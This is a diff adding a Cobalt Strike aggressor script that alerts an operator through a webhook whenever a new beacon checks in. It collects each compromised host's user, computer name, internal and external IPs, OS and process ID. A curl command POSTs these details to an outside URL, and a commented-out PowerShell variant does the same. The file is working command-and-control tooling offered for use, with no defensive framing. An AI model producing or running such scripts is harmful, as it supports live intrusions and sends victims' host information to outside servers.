@@ -1,0 +1,39 @@
+# Cobalt Strike Beacon Webhook Notifier 
+# Author SL1M3YT0AD
+
+#Alter these variables with the name of your server and webhook URL
+$webhook_url = "https://examplewebhookURL";
+$servername = "COBALT LIVE";
+
+on beacon_initial {
+    # Get beacon info
+    $bid = $1;
+    $computer = beacon_info($1, "computer");
+    $external = beacon_info($1, "external");
+    $arch = beacon_info($1, "arch");
+    $internal = beacon_info($1, "internal");
+    $user = beacon_info($1, "user");
+    $os = beacon_info($1, "os");
+    $pid = beacon_info($1, "pid");
+    $ver = beacon_info($1, "ver");
+
+    println("NEW BEACON FROM: " . $computer);
+
+    # Create message for webhook
+    $message = "*~~New Beacon~~*\n\nServer Name: $servername\nBeacon ID: $bid\nUser: $user\nComputer Name: $computer\nInternal IP: $internal\nExternal IP: $external\nArch: $arch\nOS: $os\nPID: $pid\nVersion: $ver";
+
+    # Create payload
+    $payload = "payload={\"text\": \"$message\"}";
+
+    # Call curl directly using @() syntax
+    $curl_cmd = @('curl', '-k', '-X', 'POST', '--data-binary', $payload, $webhook_url);
+
+    # Execute the curl command
+    exec($curl_cmd);
+
+    # Uncomment the following for use on a windows client 
+    # $ps_payload = "payload=\{\"text\": \"$message\"\}";
+    # $ps_cmd = @('powershell', '-c', "Invoke-WebRequest -Uri '$webhook_url' -Method 'POST' -Body '$ps_payload' -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing");
+}
+
+println("[+] Beacon Webhook Notifier loaded");
